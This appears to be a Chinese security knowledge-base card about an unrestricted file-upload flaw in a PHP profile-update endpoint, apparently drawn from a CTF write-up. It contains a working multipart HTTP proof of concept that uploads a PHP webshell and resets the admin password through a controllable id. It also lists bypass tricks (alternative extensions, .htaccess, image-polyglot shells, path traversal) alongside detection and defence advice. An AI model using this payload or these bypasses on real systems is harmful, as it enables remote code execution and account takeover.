---
id: web-generic-file-upload-user-controlled-filename-webshell
title: 用户资料更新接口不校验上传类型，保留原名落盘 Web 目录写 WebShell
type: scenario
domain: web
path: web/generic/file-upload
technique: user-controlled-filename-webshell
tags:
- web
- file-upload
- webshell
- php
- user-controlled-filename
- rce
- idor
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V11
  verified_at: '2026-11-05T01:28:20+08:00'
  notes: 已对照原文及12张图核对：update_user 仅判断 $_FILES['img'] 存在，时间戳前缀+原始文件名 move_uploaded_file 到 assets/uploads/，上传 webshell.php 后以 1761460920_webshell.php 访问读取 flag，均与图16/20/22/24一致。原文标题 CVE-2023-33440/Apache Commons Text 与正文无关，卡片未挂该 CVE，处理正确；未设置 versions。id 越权为同一请求副作用，原文未单独验证登录接管，卡片已注明条件。
url: /docs/web/generic/file-upload/web-generic-file-upload-user-controlled-filename-webshell/
draft: false
kb_aliases:
- update_user 文件上传
- 头像上传 getshell
- 原名落盘 webshell
- 任意用户资料修改
- 时间戳前缀文件名
---

## 一句话结论

资料更新/头像上传接口只检查「有没有上传文件」，随后把用户原始文件名加时间戳前缀直接 `move_uploaded_file` 到 Web 可访问目录，攻击者上传 `webshell.php` 并访问即可执行命令；同一请求还通过可控 `id` 覆盖任意用户资料。

## 原理

- 漏洞代码的核心逻辑是：
  `if (isset($_FILES['img']) && $_FILES['img']['tmp_name'] != '') { $fname = strtotime(date('y-m-d H:i')).'_'.$_FILES['img']['name']; move_uploaded_file($_FILES['img']['tmp_name'], 'assets/uploads/'.$fname); }`
- 它只判断文件是否存在、临时文件是否为空，没有检查扩展名、MIME、文件内容、文件大小；因此任意脚本都能落盘。
- 保存名是「时间戳前缀 + 原始文件名」，扩展名完全由攻击者控制；`webshell.php` 落盘后仍是 `.php`。
- 目标目录 `assets/uploads/` 位于 Web 根下且未禁止脚本执行，Apache/Nginx 会按 `.php` 交给 PHP 解释器，文件中的 `<?php system(...) ?>` 被执行。
- 接口同时接收 `id`、`firstname`、`lastname`、`email`、`password` 等字段并用于更新用户表；若没有对象级权限校验，`id` 可控就意味着可修改任意用户（如 `id=1` 的管理员）资料甚至重置密码，与上传组合可先控号再拿 shell。
- 该场景不依赖 Apache Commons Text 等组件漏洞；实际链路是应用自身的上传校验缺失。

## 触发条件

- 存在资料更新/头像上传接口，且服务端只做「文件存在」判断，未做类型/内容/大小校验。
- 上传文件名可控，或至少扩展名可控（本例原始文件名完全可控）。
- 上传目录位于 Web 根下、可被 HTTP 访问，且未关闭脚本解析。
- 攻击者可访问该接口（原文未验证是否要求登录；若需登录，任意低权限账号即可）。
- 接口的 `id` 等用户标识参数可控且无归属校验时，可同时越权修改他人资料。

## 利用步骤

1. 找到资料更新接口及其 action（如 `ajax.php?action=update_user`），确认 multipart 字段名（如 `img`）。
2. 构造包含目标用户 `id` 与资料字段的请求，在 `img` 字段上传 `webshell.php`，内容为 PHP 代码。
3. 发送请求，记录响应中返回的文件名（时间戳前缀 + 原始名）。
4. 拼接上传目录访问 URL，例如 `assets/uploads/<timestamp>_webshell.php`。
5. 访问该 URL，命令执行成功；若需要交互，可换成一句话/冰蝎等 WebShell。
6. 若 `id` 可控，可先把管理员密码改成已知值，登录后台扩大影响。

## PoC

```http
POST /ajax.php?action=update_user HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="id"

1
------X
Content-Disposition: form-data; name="firstname"

admin
------X
Content-Disposition: form-data; name="lastname"

n
------X
Content-Disposition: form-data; name="email"

admin@admin.com
------X
Content-Disposition: form-data; name="password"

root
------X
Content-Disposition: form-data; name="img"; filename="webshell.php"
Content-Type: application/octet-stream

<?php system("cat /flag");?>
------X--
```

随后访问：

```text
http://target/assets/uploads/<timestamp>_webshell.php
```

## 变体与关联

- 扩展名过滤变体：若后端后续加了黑名单，可尝试 `phtml`/`pht`/`php3` 等 Apache 可解析后缀、双写、大小写、尾随点/空格；若允许上传配置文件，可结合 `.htaccess`/`.user.ini`。
- 内容检测变体：若只查 `Content-Type`，改 `image/jpeg`；若查 `getimagesize`，用图片马或二次渲染绕过。
- 文件名变体：原始文件名可控时还可尝试路径拼接（`../`）改变落盘目录；若被过滤则退回同目录。
- 越权变体：同一 `update_user` 的 `id` 参数可指向任意用户，属于对象级授权缺失；可与上传链组合先重置管理员密码。
- 关联：[[web-generic-file-upload-extension-zero-check]]（完全不校验扩展名）；[[web-generic-file-upload-content-type-trust-bypass]]（只信 Content-Type）；[[web-generic-file-upload-htaccess-handler-override]]（上传目录允许配置覆盖时的扩展利用）。
- 边界：上传目录禁止脚本执行、文件名被随机化且扩展名被强制、或接口有严格白名单+内容校验时，本手法不成立。

## 检测与防御

- 检测：`assets/uploads/` 等上传目录出现 `.php`/`.phtml` 等脚本文件；上传请求的 filename 带脚本后缀或路径分隔符；同一账号/接口短时间内向不同 `id` 提交资料更新；访问上传目录中的新文件返回 PHP 执行结果。
- 防御：服务端白名单校验扩展名与 MIME，`getimagesize`/二次渲染确认为真实图片；用 `uniqid()`/UUID 随机重命名并强制业务后缀，完全不使用原始文件名；限制文件大小；上传目录移到 Web 根外或关闭脚本执行（Nginx `location ~ \.php$ { deny all; }`、Apache `php_admin_value engine Off`）。
- 防御：对 `id` 做对象级授权校验（只能改自己，管理员操作单独鉴权），禁止客户端直接提交角色/密码等敏感字段；更新语句使用参数化查询。
